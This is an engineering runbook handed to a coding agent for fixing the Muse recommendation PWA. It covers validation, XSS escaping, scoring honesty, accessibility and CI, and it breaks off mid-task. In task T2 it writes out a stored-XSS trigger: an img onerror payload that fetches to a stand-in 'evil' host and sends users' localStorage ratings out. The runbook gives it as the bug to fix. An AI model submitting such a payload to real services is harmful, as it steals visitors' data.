# Muse — Implementation Runbook (handoff for a coding agent)

This document is a **complete, sequenced, execute-in-order plan** derived from a two-hat
(principal-engineer + product-owner) review of Muse. It is written to be followed by a
coding model (Sonnet 5) with no further context. Every task states the exact file/line, the
symptom, the concrete change, how to verify it, and whether it needs a service-worker bump.

Findings tagged **[measured]** were reproduced with a Node harness over the real `data.json`
or checked against the live GitHub Actions / Supabase project. **[reproduced]** = confirmed by
reading the exact code path. **[reviewed]** = strong static reasoning, not yet runtime-verified.

---

## 0. Operating rules — READ BEFORE EDITING

1. **No build step.** The browser loads `index.html` → `style.css` + `app.js` directly. Only
   ever edit those three files for app changes. Do **not** hand-edit `data.json` (bot-owned)
   except where a task explicitly says so.
2. **Branch:** do all work on `claude/compassionate-euler-v0r09b`. Commit per batch with a
   clear message. Push with `git push -u origin claude/compassionate-euler-v0r09b`.
3. **Service worker:** after finishing a batch that touched `index.html`/`style.css`/`app.js`,
   run `node scripts/bump-sw.mjs` **once** (it increments `muse-vN` in `sw.js`) so returning
   users receive the update. Commit `sw.js` with the batch. Tasks below marked `SW bump: yes`.
4. **No test suite exists.** Verify engine/math changes with a throwaway Node harness that
   `require`s a copy of the pure functions (lines ~238–372 of `app.js`) and loads `data.json`.
   Verify UI changes by opening `index.html` in a browser (or reasoning precisely about the
   DOM/handlers). Never claim "done" without the stated verification.
5. **Trust boundary:** the Supabase anon key is public *by design* — embedding it is NOT the
   bug. The bugs are (a) missing input validation before attacker JSON is served to users and
   (b) `searches` being anon-readable. Fix those, don't rotate the key.
6. **Ship small.** Batch 0 is five tiny, high-trust fixes that should go out first and alone.

### Do NOT do these (verified dead-ends / out of scope)
- **Do not** remove `[skip ci]` expecting it to fix deploys. **[measured]** — the built-in
  `pages-build-deployment` ran and **succeeded** for both bot commits (`28bf12a`, `585aefa`);
  `[skip ci]` is inert here because no workflow triggers `on: push`. Removing it is optional
  cleanup only (Task T25), not a fix.
- **Do not** add a JS minifier. **[measured]** `app.js` is 24.5 KB gzipped; minifying saves
  ~12 KB = <2 % of the ~780 KB first load (96 % of which is `data.json`). Not worth a build step.
- **Do not** prioritise cover-image lazy-loading or memory work. **[measured]** a results view
  renders only ~17 `<img>`; parsed heap is ~10 MB. Non-issues at current design.
- **Do not** build per-user taste profiles from ratings yet — the table has ~6 rows. Data-starved.
- **Do not** rotate the anon key or try to hide it. See rule 5.

---

## 1. The plan at a glance

| Batch | Theme | Tasks | Ship gate |
|---|---|---|---|
| **0** | Trust & install — tiny, safe, high-impact | T1–T5 | Ship first, on its own |
| **1** | Core-loop trust: scoring honesty + navigation | T6–T11 | The "does this product feel real" batch |
| **2** | Correctness, i18n, accessibility | T12–T20 | Broadens reach; no data risk |
| **3** | Automation & backend hardening | T21–T25 | Touches scripts/workflows/Supabase only |
| **4** | Growth bets (each a separate decision) | B1–B6 | Sequenced; needs product sign-off |

**Recommended first three (one reliability, one experience, one growth):** T2 (stop serving
attacker JSON), T7+T3 (make the % mean something / stop showing a 0% "Semantic match" lie),
B1 (shareable URLs). Rationale at the end.

---

## BATCH 0 — Trust & install (ship first, alone)

### T1 — Fix PWA install: manifest points at a nonexistent `icons/` dir
- **[measured] P1 · ENG ·** `manifest.webmanifest:17-19`
- **Symptom:** manifest references `icons/icon-192.png`, `icons/icon-512.png`,
  `icons/maskable-512.png`, but those PNGs live at repo **root** and no `icons/` dir has ever
  existed (git history + live-site listing confirm). Manifest-relative URLs resolve to
  `/icons/*` → 404 → Chrome's install criteria (a fetchable 192px + 512px icon) fail. The
  install pillar of the PWA has been broken since day one.
- **Change:** point the three `src` values at the real files:
  ```json
  { "src": "icon-192.png",      "sizes": "192x192", "type": "image/png", "purpose": "any" },
  { "src": "icon-512.png",      "sizes": "512x512", "type": "image/png", "purpose": "any" },
  { "src": "maskable-512.png",  "sizes": "512x512", "type": "image/png", "purpose": "maskable" }
  ```
- **Verify:** load the site, DevTools → Application → Manifest shows all icons loading (no red
  404); the "Installability" section reports no errors.
- **SW bump:** no (manifest isn't code) — but manifest is in the SW precache list, so bump
  anyway if bundling with other Batch-0 edits.

### T2 — Stop serving attacker-controlled JSON + close the stored-XSS holes
- **[measured] P0/P1 · ENG ·** `scripts/ingest.mjs:34-47`, plus sinks `app.js:404,420,465,619`
- **Symptom (two linked bugs):**
  1. Anyone with the public anon key can `POST` arbitrary `{cat,title,item}` to the `searches`
     table (RLS `CHECK(true)`, no shape/size limit). `ingest.mjs` validates only `cat ∈ VALID`,
     `item.t` truthy, `item.g` a non-empty array — then pushes the **whole object verbatim** into
     `data.json`, which is committed to `main` and served + SW-precached to every user.
  2. Four rendered fields are **not** run through `esc()`: `it.y` (`metaLine:420`,
     `suggCards:465`, `acOpt:619`) and the `meter()` value + `data-w` attr (`app.js:404`).
     Every other field is escaped; these are the gap.
- **Trigger:** `POST /rest/v1/searches` with
  `item.y = "2021<img src=x onerror=fetch('//evil/?c='+localStorage.getItem('muse-ratings'))>"`.
  Next daily ingest folds it in; Pages redeploys; the payload executes the instant any user
  types the matching title (autocomplete `acOpt`) or opens the card.
- **Change — two layers:**
  1. **Input (authoritative), `ingest.mjs`** — replace the light check with a strict validator
     before `data[cat].push(it)`:
     ```js
     const HOSTS = new Set(['image.tmdb.org','covers.openlibrary.org','upload.wikimedia.org']);
     function clean(it){
       const o = {};
       o.t = String(it.t).slice(0,80);
       o.g = (Array.isArray(it.g)?it.g:[]).filter(x=>typeof x==='string').slice(0,6).map(s=>s.slice(0,24));
       if(!o.g.length) return null;
       o.y = Number.isFinite(+it.y) ? Math.trunc(+it.y) : null;
       o.by = it.by ? String(it.by).slice(0,80) : '';
       o.dna = Array.isArray(it.dna) && it.dna.length===8 && it.dna.every(n=>Number.isFinite(+n))
             ? it.dna.map(n=>Math.max(0,Math.min(100,Math.round(+n)))) : null;
       if(!o.dna) return null;
       o.th = (Array.isArray(it.th)?it.th:[]).filter(x=>typeof x==='string').slice(0,6);
       o.pop = Math.max(0,Math.min(100,Math.round(+it.pop||0)));
       o.acc = Math.max(0,Math.min(100,Math.round(+it.acc||0)));
       o.main= Math.max(0,Math.min(100,Math.round(+it.main||0)));
       o.hue = Number.isFinite(+it.hue) ? Math.trunc(+it.hue)%360 : 222;
       o.c   = it.c ? String(it.c).slice(0,40) : '';
       try{ const u=new URL(it.img); o.img = (u.protocol==='https:'&&HOSTS.has(u.host)) ? u.href : null; }
       catch{ o.img = null; }
       const S = s => (typeof s==='string'? s.slice(0,80): '');
       o.tl = { en:S(it.tl&&it.tl.en)||o.t, es:S(it.tl&&it.tl.es)||o.t, pt:S(it.tl&&it.tl.pt)||o.t };
       o.d  = { en:S(it.d&&it.d.en), es:S(it.d&&it.d.es), pt:S(it.d&&it.d.pt) };
       o.x  = (it.x && typeof it.x==='object' && JSON.stringify(it.x).length<1500) ? it.x : {};
       o.alt=[]; o.cast=[];
       if(JSON.stringify(o).length > 4000) return null;
       return o;
     }
     // ...in the loop: const it = clean(row.item); if(!it) continue; ... (id assignment as before)
     ```
     Also **cap rows/run** (e.g. `if(added >= 200) break;`) so a flood can't bloat the catalog
     in one night.
  2. **Output (defence-in-depth), `app.js`** — wrap the four sinks:
     `metaLine:420` → `bits.push(esc(String(it.y)))`; `suggCards:465` →
     `esc(String(it.y || (it.x&&it.x.reg) || it.c || ''))`; `acOpt:619` →
     `esc(String(it.y))`; `meter()` at `:404` → `esc(String(val))` in **both** the text node
     and the `data-w` attribute.
- **Verify:** run `node scripts/ingest.mjs` against a test row containing an `onerror` payload
  and an off-allowlist `img` host — confirm the emitted item is dropped or sanitised. In the
  browser, confirm cards/autocomplete still render normal items unchanged.
- **SW bump:** yes (app.js changed). `ingest.mjs`/`data.json` changes deploy via the daily job.
- **Follow-up (Batch 3, T24):** also add a CSP and lock down the RLS so this can't recur.

### T3 — Remove the visible scoring lies (0% "Semantic match", 122% weights, "18 vs 9 algorithms")
- **[measured] P2 · ENG+PRODUCT ·** `app.js:505` (bars), `:460-462` (lab), `:65-67,81,113-115` (copy)
- **Symptom:** the `emb` term is dormant (`embeddings.b64.json` doesn't exist), so `parts.emb`
  is **null in 200/200** measured cases. `matchCard` builds bars from
  `Math.round((m.s.parts[id]||0)*100)` over **all** `CATALGOS` rows, so the first bar on every
  expanded card reads **"Semantic match 0%"**. The Algorithm-lab panel lists "Semantic match —
  22% weight" for an algorithm that never runs, and the per-category weights it prints sum to
  **122%**. Copy is also inconsistent: stats/foot say "18 algorithms", `topSub` says "9".
- **Change:**
  1. `matchCard` (`:505`) — build bars only from present signals:
     ```js
     const algos = CATALGOS[state.cat]
       .filter(([id]) => m.s.parts[id] != null)
       .map(([id]) => ({ id, nm: id==='craft'?tr(CRAFT_NAMES[state.cat]):tr(ALGO_NAMES[id]),
                         v: Math.round(m.s.parts[id]*100) }));
     ```
     (Keep logging `null` — not `0` — in the `parts` payload sent to Supabase.)
  2. Lab (`renderChrome`, `:460`) — hide algos that can't fire and renormalise the shown weights:
     ```js
     const rows = CATALGOS[state.cat].filter(([id]) => id!=='emb' || EMB_BUF);
     const den = rows.reduce((s,[,w])=>s+w,0);
     $('labGrid').innerHTML = rows.map(([id,w]) => { /* ...Math.round(w/den*100)+'%'... */ }).join('');
     ```
  3. Copy — derive the count instead of hardcoding: compute
     `const NALGO = CATALGOS[state.cat].filter(([id])=>id!=='emb'||EMB_BUF).length;` and
     template it into `T.stats`/`T.topSub`/`T.foot` (replace the literal `18`/`9`). Keep one
     number everywhere.
  When embeddings ship (Batch 4 B2) the `emb` bar/row/weight reappear automatically because
  every filter keys off `EMB_BUF`/`parts`, not a hardcoded list.
- **Verify:** expand a card → no "Semantic match 0%"; open the lab → weights sum to 100 %;
  stats/subhead/foot show the same algorithm count.
- **SW bump:** yes.

### T4 — First-load loading state + honest offline error
- **[measured] P1 · ENG+PRODUCT ·** `app.js:748-753`, `:116`, `:578-580`
- **Symptom:** `renderChrome`/`renderAll` run only **after** the 3.6 MB (773 KB gzip) `data.json`
  fetch resolves. Until then the user sees an empty search box, empty nav, blank `#out` — no
  spinner — for the whole download (Fast-3G ≈ 4.3 s; slower on real 3G). If the fetch fails
  (offline first visit, captive portal) the `catch` renders the **developer** string
  *"Dataset not embedded yet — this is the empty shell build."* with no retry.
- **Change:** render static chrome + a loading state immediately at boot, before/around the
  fetch; give failure a real, localized message + Retry.
  ```js
  function boot(){
    indexData();               // safe: dataOK=false when D is null, guards already exist
    renderChrome();            // chrome needs no data (use a placeholder count in T.stats)
    $('out').innerHTML = '<div class="livewait">'+esc(tr(T.loading))+'</div>';
  }
  function finishInit(){ indexData(); renderAll(); loadEmb(...).then(...).catch(()=>{}); }
  if (D && typeof D==='object') { finishInit(); }
  else { boot();
    fetch('data.json').then(r=>{ if(!r.ok) throw 0; return r.json(); })
      .then(j=>{ D=j; finishInit(); })
      .catch(()=>{ $('out').innerHTML =
        '<div class="livewait">'+esc(tr(T.loadFail))+
        '<br><button class="suggest" data-retry>'+esc(tr(T.retry))+'</button></div>'; });
  }
  ```
  Add `T.loading`, `T.loadFail` ("Couldn't load the catalog — check your connection"),
  `T.retry` (trilingual). Wire `[data-retry]` in the click handler to re-run the fetch. Keep
  `T.dataMissing` only for the genuine `D===null && fetch also failing` dev case, or delete it.
- **Verify:** DevTools → Network → offline, hard-reload → you see the loading state then the
  friendly error + Retry, not the dev string. Throttle to Slow-3G → chrome + spinner appear
  immediately, not a blank page.
- **SW bump:** yes.

### T5 — The hero tagline is dead code; show it on home
- **[reproduced] P2/P3 · PRODUCT ·** `app.js:579-580`
- **Symptom:** `renderAll` runs `if(pit) pit.hidden=true;` **unconditionally** whenever
  `dataOK`. The `home` flag on `:579` gates `cats`/`lab` but is never applied to the pitch, so
  the "Love one thing. Find everything like it." hero + stats line **never render** (they only
  appeared in the `dataMissing` dev branch). The page also ships with no `<h1>` as a result.
- **Change:** `:580` → `if(pit) pit.hidden = !home;` (show the hero on the home/empty state,
  hide it on results). Confirm `renderEmpty`'s spotlight doesn't visually duplicate it; if it
  does, drop the spotlight's redundant line and keep the pitch as the single `<h1>`.
- **Verify:** load home → tagline + stats visible; select an item → hero hidden; go home → back.
- **SW bump:** yes.

---

## BATCH 1 — Core-loop trust: make the numbers honest + add navigation

### T6 — Hash routing + working back button + share (this is also growth bet B1)
- **[measured] P1 · ENG+PRODUCT ·** `app.js:625-630, 704, 710, 748-751`; source card `:547-550`
- **Symptom:** there is **zero** `location`/`history`/`hashchange`/`navigator.share` code
  (grep-verified). A refresh loses the result; the Android **back button exits the PWA**
  (fatal in `display:standalone`); a delighted user cannot link "look what Muse found" to a
  friend. This caps organic growth at zero and breaks basic mobile nav.
- **Change:**
  1. Write state to the hash on navigation (guard re-entrancy). In `select()` (`:625`):
     `if(!_fromHash) location.hash = state.cat + '/' + (state.sel||'');`. Same in the
     home handler (`:704`, empty hash) and category handler (`:710`, `cat` only).
  2. Parse on boot + on change. In `finishInit()` add `applyHash()` and
     `window.addEventListener('hashchange', applyHash);` where `applyHash` splits
     `location.hash.slice(1)` into `cat/id`, and if `byId[id]` exists calls `select(id,false)`
     with a `_fromHash` flag; empty → home; `live-*` ids → re-run `selectLive(cat, slug)`.
  3. Share button on the source card (`:547-550`):
     ```js
     '<button class="fixlink" data-share>'+esc(tr(T.share))+'</button>'
     // handler:
     if(e.target.closest('[data-share]')){ const u=location.href;
       if(navigator.share) navigator.share({title:'Muse — '+TT(src), url:u});
       else navigator.clipboard.writeText(u); /* show T.copied via the .thx pattern */ }
     ```
- **Verify:** select → URL becomes `…/#movies/mv-casablanca`; reload → same result restored;
  back button walks result→result→home instead of closing; share opens the sheet / copies.
  No SW change needed for hash nav (never hits network) but app.js changed → bump.
- **SW bump:** yes.

### T7 — Recalibrate the engine: 71% of ALL matches are labeled "Soul twin"
- **[measured] P1 · ENG ·** `app.js:263` (sigmas), `:341` (pct curve), `:393` (tiers)
- **Symptom:** `DNA_SIGMA=0.25` / `FEAT_SIGMA=0.28` are so wide the Gaussians saturate —
  measured over 156 searches × top-10, the displayed pct is **≥85 ("Soul twin") for
  1115/1560** results, 70–84 for 307, and **below 55 for only 4**. `dnaSim` for *random*
  same-category pairs has median 0.71; `audSim` ~0.75. With `emb` dormant these near-constant
  terms are 33–48 % of the blend, and `pct = pow(total,0.8)` (`:341`) inflates everything into
  the 80–99 band. The headline number and the `qual()` tiers carry almost no information.
- **Change (tune to a target, don't blind-set):**
  1. Tighten the Gaussians so a *random* pair lands near the middle of the range, not the top:
     start `DNA_SIGMA ≈ 0.13`, `FEAT_SIGMA ≈ 0.15`, then measure and adjust so random-pair
     `dnaSim` median ≈ 0.30.
  2. Replace the vanity curve at `:341`. Either raise the exponent (`Math.pow(total, 1.2)`) or —
     better — make pct a **percentile within the current candidate pool** so it always spreads:
     `pct = round(100 * (rankFromBottom / poolSize))`, clamped to a floor so #1 isn't 99.
  3. Re-check the `qual()` cutoffs (85/70/55, `:393`) split a *real* result list into all four
     tiers, not one. Adjust cutoffs to the new distribution.
- **Verify (mandatory harness):** copy the pure functions + `CATALGOS`/`score` into a Node
  script, load `data.json`, sample ~150 random sources, and print the top-10 pct histogram.
  **Acceptance:** no single `qual()` tier holds >45 % of results; the median top-1 pct is
  clearly above the median top-10 pct (the list visibly ranks). Iterate sigma/curve until met.
- **SW bump:** yes. **Note:** this is the highest-leverage correctness change; do it carefully
  and keep the harness output in the commit message.

### T8 — Null-vs-0 renormalization rewards missing metadata
- **[measured] P1 · ENG ·** `app.js:335-342` (score), `:321` (srcdem), `:280-283` (culture)
- **Symptom:** skip-and-renormalize makes a missing term equal to *"the mean of the present
  terms,"* so any real value **below** that mean (e.g. `culture=0` cross-region, `era` for
  distant years) actively **penalizes items that have the data** vs the majority that lack it
  (1470/1531 movies have no `c`; 364/653 anime have no `y`). Measured:
  `score(Casablanca, Seven Samurai)` = **45** with `c:'Japan'` present vs **48** with `c`
  deleted. Two cards showing the same % can rest on 54 % vs 94 % weight coverage, so the number
  isn't even comparable **between rows of one list**. `srcdem` (`:321`) is additionally
  asymmetric — it returns `0` (not `null`) when only the candidate lacks `src/dem`.
- **Change (pick one; A is safe, B is fuller):**
  - **A — coverage factor (low-risk):** keep renormalize, then damp by coverage:
    `total = (den>0 ? num/den : 0) * (0.85 + 0.15*coverage);` and surface `coverage` in the lab
    breakdown so the number's confidence is visible.
  - **B — prior imputation (correct):** precompute a corpus prior mean per algo per category
    once after `indexData`, and for a `null` term do `num += prior[id]*w; den += w;` instead of
    skipping. This removes the "sparse item wins" bias entirely.
  - **Both:** make `srcdem` symmetric — `return null` unless **both** items carry `src`/`dem`.
    Fix the stale `cultureSim` comment (`:282` claims "null only if BOTH lack" but the code
    nulls if **either** lacks; align code to the comment — null only when both lack region).
- **Verify:** in the harness, delete `c`/`y` from an item and confirm its rank no longer
  improves; confirm two items with equal displayed pct now have comparable coverage.
- **SW bump:** yes.

### T9 — `whyText` over-claims on almost every card and lies on weak ones
- **[measured] P2 · ENG+PRODUCT ·** `app.js:425-440` (esp. threshold `:430`, fallback `:437`)
- **Symptom:** the `r.v < .42` claim gate is passed by **92 % (mood), 99 % (craft), 100 %
  (audience)** of *random* movie pairs — so "twin pacing & visual style" fires on nearly any
  pair. Worse, the fallback (`:437`) asserts `WHY.mood` — *"a near-identical mood fingerprint"* —
  precisely when **no** term reached .42, i.e. when mood is objectively *dissimilar*. The one
  line users can sanity-check is systematically over-claimed and sometimes the opposite of true.
- **Change:**
  1. Use per-algo thresholds at each signal's corpus **p80** instead of a flat .42: measure in
     the harness (roughly mood ≈ 0.88, craft ≈ 0.90, audience ≈ 0.85; keep ≈ 0.42 for
     theme/genre/creator/culture which pass only ~12 %/12 %/0 % of random pairs).
  2. Replace the fallback: instead of `WHY.mood`, take the **actual top-contributing** term from
     the already-sorted `ranked` and render an honest hedged line, e.g. new
     `T.whyLoose = {en:'a looser match — closest on {x}', …}` with `x` = that algo's display
     name. Never claim "near-identical" below threshold.
  3. (Pairs with T7) for `pct < 55` render the `.quality` label in `--dim` not `--acc` (1 CSS
     rule + a class in `matchCard:508`) so weak matches visually self-identify.
- **Verify:** in the harness, generate whyText for a random low-similarity pair → it no longer
  says "near-identical"; a strong pair still names real shared themes/genres.
- **SW bump:** yes.

### T10 — "Beyond" picks are argmax over rounded ints (file order breaks ties); it also outranks the real results
- **[measured] P1 · ENG + P2 PRODUCT ·** `app.js:344-350` (crossScore), `:544-546` (argmax), `:569` (order), `:552-554` (card)
- **Symptom:** `crossScore` **rounds to an int** before returning and `renderResults` picks the
  winner with strict `if(p>bp)` (`:545`), so among all candidates tied at the max **the first
  item in `data.json` always wins** — measured tie density is median 2, p90 11, **max 56**
  candidates. With `emb` dormant, crossScore is only ⅔ saturated `dnaSim` + ⅓ theme cosine — the
  thinnest signal in the app — yet the DOM order (`:569` = `srcCard+pairs+bey+list`) puts this
  carousel **above** the in-category matches the user actually asked for, with the boldest numbers.
- **Change:**
  1. Return the **raw** blend from `crossScore`; round only at display. Tie-break the argmax by
     a real signal: `if(p>bp || (p===bp && it.acc>best.acc))`.
  2. Reorder `:569` to `srcCard + pairs + list + bey` (matches first). Keep `pairs` above `list`
     only for `food`, where complementarity is the primary intent.
  3. While `!EMB_BUF`, in the Beyond card (`:552-554`) replace the numeric `<span class="pc">`
     with the `qual()` word tier ("Strong echo") — less false precision than a mood-distance 94.
  4. When `loadEmb()` succeeds (`:750`) flip 2+3 back (a flag) — makes the eventual embeddings
     launch a visible upgrade.
- **Verify:** search the same source twice → same Beyond pick (deterministic tie-break);
  matches now appear above Beyond; Beyond shows word tiers, not numbers, until embeddings ship.
- **SW bump:** yes.

### T11 — Every card expand/collapse re-runs the whole scoring engine
- **[measured] P1 · ENG ·** `app.js:714-719` (toggle), `:533-570` (renderResults)
- **Symptom:** tapping a card to expand/collapse calls `renderResults()`, which re-scores the
  source vs all ~1530 movies, re-runs `crossScore` vs all ~4727 other-category items, re-runs
  `mmrRerank`, and rebuilds a 32–36 KB innerHTML string — for a purely visual accordion toggle
  whose scores cannot have changed. **Measured full compute: movies 22 ms on this machine ⇒
  ~90–130 ms on a mid-range Android**, on the most common interaction.
- **Change:** memoize the scored pipeline keyed by `(state.sel, state.cat)`. Compute
  `matches`/`beyond` once in `select()`, stash on `state`, and have `renderResults` read the
  cache. For the toggle itself, re-render only the tapped `<article>` (replace its `outerHTML`)
  or pre-render the expanded body and toggle a CSS class — don't re-render the list.
- **Verify:** add a `performance.now()` around the toggle handler → expand/collapse drops from
  ~20 ms to <5 ms; results unchanged.
- **SW bump:** yes.

---

## BATCH 2 — Correctness, i18n, accessibility

### T12 — `norm()` strips all non-Latin script → CJK/Cyrillic/Arabic titles unsearchable
- **[reproduced] P1 · ENG ·** `app.js:238`, used at `:383` (keys) and `:604` (query)
- **Symptom:** `norm()` keeps only `[a-z0-9 ]`, mapping any Cyrillic/CJK/Arabic string to `''`.
  This runs on both the query and the autocomplete `_keys`, so the 13 native-script `alt`
  titles (킹덤, 三体, こころ…) and 4 non-Latin primary titles are silently dropped. Typing a native
  title → empty suggestions → only the live row shows → Enter creates a **live duplicate of an
  item already in the catalog**.
- **Change:** widen the keep-set to Unicode letters/digits:
  `.replace(/[^\p{L}\p{N} ]+/gu,' ')` (note the `u` flag). Keep the NFD + diacritic strip for
  Latin. Then the existing exact/prefix logic in `suggScore` matches native scripts and the
  local item wins before live is offered.
- **Verify:** type `三体` → the local "The Three-Body Problem" appears in autocomplete (it carries
  that `alt`); no live row needed.
- **SW bump:** yes.

### T13 — Live lookup: dedupe vs local, gate on enrichment, validate category
- **[reproduced] P1/P2 · ENG ·** `app.js:664` (jget), `:685` (mint id), `:689-699` (selectLive), `:668-688` (liveLookup)
- **Symptom (three linked defects):**
  1. **No runtime dedup:** `liveLookup` mints `live-<cat>-<slug>` with no check against `byId`/
     normalized local titles; `selectLive` POSTs it unconditionally. A typo past `lev` max=2 or a
     non-Latin query (T12) routes a curated title to live and creates a duplicate.
  2. **Silent enrichment failure:** `jget` swallows every error → when the Wikidata SPARQL call
     is throttled (routine for keyless browser requests), `wd` is null → genres empty → item
     collapses to a generic **"drama" stub with fabricated DNA**, which is still POSTed + ingested.
  3. **Category inheritance:** `selectLive` always uses `state.cat`, so searching "Inception"
     while the **Books** tab is active mints a *book* named Inception and ingests it as one.
- **Change:**
  1. Before `liveLookup`/before POSTing, look up the normalized title in a title index across
     categories; if found, `select()` the local item instead and skip live.
  2. Add a `User-Agent` + one retry to the WDQS fetch; if the SPARQL result is null or yields no
     genre, **do not POST** and show `T.noWebResult` (distinguish "not found" from "enrichment
     failed"). Never ingest a genre-less stub.
  3. After resolving the Wikidata entity, read `P31` (instance-of) and infer the real category;
     correct `state.cat` (or reject) before rendering/POSTing.
- **Verify:** search a known catalog title with 3 typos → resolves to the **local** item, no
  POST; simulate a SPARQL failure → friendly "couldn't find", no ingest; search a book title on
  the Movies tab → it's classified as a book (or rejected), not minted as a movie.
- **SW bump:** yes.

### T14 — `html lang` stays "en" and all aria-labels/title are hardcoded English
- **[reproduced] P2/P3 · ENG ·** `index.html:2,13-15,34,37,42,43,49`; `app.js:702-703, 448-463`
- **Symptom:** the language switch only re-renders strings; `document.documentElement.lang` is
  never updated, so ES/PT screen-reader users get **English phonemes** and every landmark/control
  ("Home", "Search", "Surprise me", "Language", "Categories") is announced in English.
- **Change:** in the lang handler / `renderChrome`, add
  `document.documentElement.lang = state.lang==='pt' ? 'pt-BR' : state.lang;` and
  `document.title = tr(T.docTitle);`. Move the five aria-labels into `T` and apply them via
  `setAttribute` in `renderChrome` alongside the placeholder. (Manifest name/description can stay
  EN for now — fixing in-app `lang` + aria + title is the priority.)
- **Verify:** switch to ES, inspect `<html>` → `lang="es"`; screen reader announces controls in ES.
- **SW bump:** yes.

### T15 — `select()` puts the base (EN) title into the search box
- **[measured] P3 · ENG ·** `app.js:628`, `:696`
- **Symptom:** every surface shows `TT(it)` (localized) but on selection the box is set to
  `it.t` (base). In ES, picking "El padrino" from autocomplete snaps the box to "The Godfather".
- **Change:** `$('q').value = TT(it)` in both `select()` (`:628`) and `selectLive()` (`:696`).
- **Verify:** ES, pick a localized title → the box keeps the Spanish name.
- **SW bump:** yes.

### T16 — Keyboard/AT: cards not focusable, live row unreachable, autocomplete has no ARIA
- **[measured] P2 · ENG ·** `app.js:510,514,550,554,567` (cards), `:613-614,730-739` (ac), `index.html:42,45`
- **Symptom:** match `<article>`s, Beyond/pairing `<div>`s and the "Wrong name?" `<span>` have
  **no tabindex/role/keydown** — unreachable by keyboard, invisible to screen readers. The live
  "Search the web" row is appended **outside** `acItems`, so ArrowDown/Enter can never reach it
  while any fuzzy local suggestion exists (and `suggScore` almost always returns one), locking
  keyboard users out of the flagship "find anything" feature. `#q`/`#ac` have no
  combobox/listbox ARIA at all.
- **Change:**
  1. Make result interactions real controls: render the match header/`.more`, `.bx`, and
     `.fixlink` as `<button>` (they already have button-reset CSS) or add
     `tabindex="0" role="button"` + a keydown Enter/Space branch mirroring the click delegation
     for `[data-sel]`/`[data-mid]`/`[data-fix]`.
  2. Treat the live row as `acItems.length+1`: cycle `acIdx` over that range, select the live
     row when `acIdx===acItems.length`, and route Enter on that index to
     `selectLive(state.cat, $('q').value)`. After each arrow move,
     `el.querySelector('.opt.sel')?.scrollIntoView({block:'nearest'})`.
  3. ARIA: `#q` → `role="combobox" aria-autocomplete="list" aria-controls="ac"`, toggle
     `aria-expanded` in `renderAC`/`hideAC`; `#ac` → `role="listbox"`, each row
     `id="ac-opt-N" role="option" aria-selected`; update `aria-activedescendant` on `#q` in the
     arrow handler.
- **Verify:** Tab lands on each match card and the fix link; Enter expands; arrow keys reach the
  live row; VoiceOver/NVDA announces the combobox + option count.
- **SW bump:** yes.

### T17 — Picking a suggestion leaves the mobile keyboard open over the results
- **[reproduced] P1 · ENG ·** `app.js:723-724` (mousedown preventDefault), `:625-630, 689-699`
- **Symptom:** the `#ac` mousedown handler calls `preventDefault()` (blocks the blur), and
  `select`/`selectLive` never blur `#q`, so after tapping a suggestion the phone keyboard stays
  up and `scrollIntoView({behavior:'smooth'})` scrolls the results underneath it.
- **Change:** in `select()` and `selectLive()` call `$('q').blur()` before scrolling, and gate
  motion: `const behavior = matchMedia('(prefers-reduced-motion:reduce)').matches?'auto':'smooth';`
- **Verify:** on a phone (or device-emulation), tap a suggestion → keyboard dismisses, results
  scroll into view cleanly.
- **SW bump:** yes.

### T18 — Radar is invisible in light theme; `--dim` microcopy fails WCAG AA
- **[measured] P2 · ENG ·** `app.js:410-416,519` (radar), `style.css:8,18` (`--dim`/`--faint`)
- **Symptom:** `radar()` hardcodes `rgba(255,255,255,…)` for rings, spokes, the "yours" polygon
  and labels; over the light theme's `--panel:#fff` that's a **1.00:1** ratio — literally
  invisible. `--dim` computes to **3.1–3.7:1** in both themes (below the 4.5:1 AA floor) and is
  used for 8.5–12 px microcopy across rank/meter/rating/footer/lab text.
- **Change:**
  1. Radar: rings/spokes `stroke="var(--line2)"`; "yours" polygon
     `stroke/fill: color-mix(in srgb, var(--ink) 45%, transparent)`; labels `fill="var(--mut)"`;
     legend swatch `background: var(--mut)`. Add a visually-hidden text summary of the 8 axis
     values for AT.
  2. Contrast: raise `--dim` to ≈`#8a8a94` (dark) / `#6e6e77` (light) (~4.6–5:1), reserve
     `--faint` for decorative separators only, and floor the 8.5–9.5 px mono styles at 11 px.
- **Verify:** open a breakdown in light theme → radar visible; run any contrast checker on the
  new `--dim` pairings → ≥4.5:1.
- **SW bump:** yes.

### T19 — `buildIDF` global floor erases rarity weighting for 78% of genres
- **[measured] P1/P2 · ENG ·** `app.js:250-254`
- **Symptom:** `FL = max(5, round(0.01*N))` with N=6258 = **63**, but IDF is built over the pooled
  8-category corpus while genres are **category-local** vocabularies. 128/165 genres (grunge
  df=1, trip-hop df=1, arcade df=1…) sit below 63, so they all get the identical capped weight —
  "grunge" weighs the same as a 60× more common tag, defeating the feature's stated purpose,
  worst in the smaller categories that have the least other signal.
- **Change:** build genre IDF **per category** with a category-relative floor —
  `FL = Math.max(3, Math.round(0.01*catList.length))` computed within each `cat`'s items. Keep
  themes global (shared 48-term vocab) but drop the theme floor to ~10.
- **Verify:** in the harness, print `genreIDF` for a rare music genre before/after → it's now
  distinctly higher than a common one; a niche-genre search reorders sensibly.
- **SW bump:** yes.

### T20 — `mmrRerank` creator cap misfires in food/travel (caps by cuisine/country)
- **[measured] P2 · ENG ·** `app.js:356`
- **Symptom:** the ≤2-per-creator diversity cap keys on `it.by`, but in food `by` is
  "traditional"/"italian cuisine"/"indian cuisine" and in travel it's a country
  ("spain"×17) — so at most 2 Italian dishes or 2 Spanish destinations can ever appear, even
  though `creator` isn't a scored signal in food/travel. Measured: "Loco moco" returns only 9
  results because the cap starves the pool.
- **Change:** apply the cap only where creator is scored:
  `const capOn = CATALGOS[cat].some(([id])=>id==='creator');` and skip the `>=2` check when
  `!capOn`.
- **Verify:** search an Italian dish → more than 2 Italian results; "Loco moco" returns 10.
- **SW bump:** yes.

---

## BATCH 3 — Automation & backend hardening (scripts / workflows / Supabase only; no SW bump)

### T21 — Workflows push to `main` with no pull/rebase/retry; separate concurrency groups
- **[measured] P2 · ENG ·** `.github/workflows/refresh.yml:13-15,33-42`, `ingest.yml:8-9,21-31`
- **Symptom:** refresh (group `refresh-catalog`) and ingest (group `ingest-searches`) are in
  **different** concurrency groups, so they don't serialize against each other or against manual
  dispatch. Both do a bare `git push` on a checkout captured at job start. `refresh.mjs` can run
  tens of minutes (backfill budget 4000 items × up to 2 TMDB calls × 70 ms sleeps); a push that
  races another commit is rejected non-fast-forward and the whole run's TMDB work is discarded.
- **Change:** before push, `git pull --rebase origin main` then push in a 3× retry loop with
